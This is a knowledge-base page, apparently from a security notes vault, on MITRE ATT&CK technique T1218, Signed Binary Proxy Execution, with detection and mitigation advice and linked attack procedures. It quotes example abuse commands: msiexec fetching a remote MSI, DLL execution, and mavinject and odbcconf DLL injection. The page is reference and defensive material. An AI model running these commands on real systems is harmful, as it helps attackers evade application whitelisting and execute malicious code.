---
id: 425b0f88-0065-4c54-9a0a-0b42e1e03465
name: Signed Binary Proxy Execution
type: technique
mitre_id: T1218
mitre_url: null
created_at: '2019-08-28T21:17:27.997783+00:00'
updated_at: '2023-05-29T16:48:53.672970+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
procedures:
- '[[ActiveX-Based Autorun Macro with InkPicture Control and Painted Event]]'
- '[[Azure SSRF for VM Metadata Service]]'
- '[[Bypassing Constrained Language Mode using Powershell DLL Runner]]'
- '[[Java RMI Exploitation for Remote Command Execution using sjet or mjet]]'
- '[[JWT Signature Key Injection Attack]]'
- '[[Linux - SUDO NOPASSWD Privilege Escalation via Vim]]'
- '[[Mshta Remote HTA Execution]]'
- '[[MYSQL Dumpfile PHP Shell Creation]]'
- '[[MYSQL Error Based - UpdateXML function Data Extraction]]'
- '[[PHP Deserialization with Monolog/RCE1 and Swiftmailer/FW1 Gadgets]]'
- '[[PostgreSQL File Read Procedure]]'
- '[[PrintNightmare WebDAV Attack]]'
- '[[Web Delivery and Proxy Credential Stealing]]'
- '[[Windows ODBC Driver Registration via Odbcconf]]'
- '[[Windows - RDP Backdoor using utilman.exe]]'
- '[[XSLT Injection - Remote Code Execution with Java]]'
---

# Signed Binary Proxy Execution

**MITRE ID**: T1218

## Description

Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.Msiexec.exeMsiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files.[1][2][3] Msiexec.exe may also be used to execute DLLs.[1]msiexec.exe /q /i "C:\path\to\file.msi"msiexec.exe /q /i http[:]//site[.]com/file.msimsiexec.exe /y "C:\path\to\file.dll"Mavinject.exeMavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. [4]"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" <PID> /INJECTRUNNING <PATH DLL>C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL>SyncAppvPublishingServer.exeSyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe. [5]Odbcconf.exeOdbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.[6] The utility can be misused to execute functionality equivalent to Regsvr32 with the REGSVR option to execute a DLL.[7][8][9]odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}Several other binaries exist that may be used to perform similar behavior. [10]

# Detection

Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.

# Mitigation

Certain signed binaries that can be used to execute other programs may not be necessary within a given environment. Use application whitelisting configured to block execution of these binaries if they are not required for a given system or network to prevent potential misuse by adversaries. If these binaries are required for use, then restrict execution of them to privileged accounts or groups that need to use them to lessen the opportunities for malicious use.

# Footnotes

[1] LOLBAS. (n.d.). Msiexec.exe. Retrieved April 18, 2019.

[2] Ash, B., et al. (2018, June 26). RANCOR: Targeted Attacks in South East Asia Using PLAINTEE and DDKONG Malware Families. Retrieved July 2, 2018.

[3] Co, M. and Sison, G. (2018, February 8). Attack Using Windows Installer msiexec.exe leads to LokiBot. Retrieved April 18, 2019.

[4] Giuseppe. (2017, December 14). gN3mes1s Status Update. Retrieved April 10, 2018.

[5] Landers, N. (2017, August 8). monoxgas Status Update. Retrieved April 10, 2018.

[6] Microsoft. (2017, January 18). ODBCCONF.EXE. Retrieved March 7, 2019.

[7] LOLBAS. (n.d.). Odbcconf.exe. Retrieved March 7, 2019.

[8] Bermejo, L., Giagone, R., Wu, R., and Yarochkin, F. (2017, August 7). Backdoor-carrying Emails Set Sights on Russian-speaking Businesses. Retrieved March 7, 2019.

[9] Giagone, R., Bermejo, L., and Yarochkin, F. (2017, November 20). Cobalt Strikes Again: Spam Runs Use Macros and CVE-2017-8759 Exploit Against Russian Banks. Retrieved March 7, 2019.

[10] Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018.

[11] Kaspersky Lab. (2015, June 11). The Duqu 2.0. Retrieved April 21, 2017.

## Defense

Certain signed binaries that can be used to execute other programs may not be necessary within a given environment. Use application whitelisting configured to block execution of these binaries if they are not required for a given system or network to prev

## Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

## Related Procedures (16)

- [[ActiveX-Based Autorun Macro with InkPicture Control and Painted Event]]
- [[Azure SSRF for VM Metadata Service]]
- [[Bypassing Constrained Language Mode using Powershell DLL Runner]]
- [[Java RMI Exploitation for Remote Command Execution using sjet or mjet]]
- [[JWT Signature Key Injection Attack]]
- [[Linux - SUDO NOPASSWD Privilege Escalation via Vim]]
- [[Mshta Remote HTA Execution]]
- [[MYSQL Dumpfile PHP Shell Creation]]
- [[MYSQL Error Based - UpdateXML function Data Extraction]]
- [[PHP Deserialization with Monolog/RCE1 and Swiftmailer/FW1 Gadgets]]
- [[PostgreSQL File Read Procedure]]
- [[PrintNightmare WebDAV Attack]]
- [[Web Delivery and Proxy Credential Stealing]]
- [[Windows ODBC Driver Registration via Odbcconf]]
- [[Windows - RDP Backdoor using utilman.exe]]
- [[XSLT Injection - Remote Code Execution with Java]]
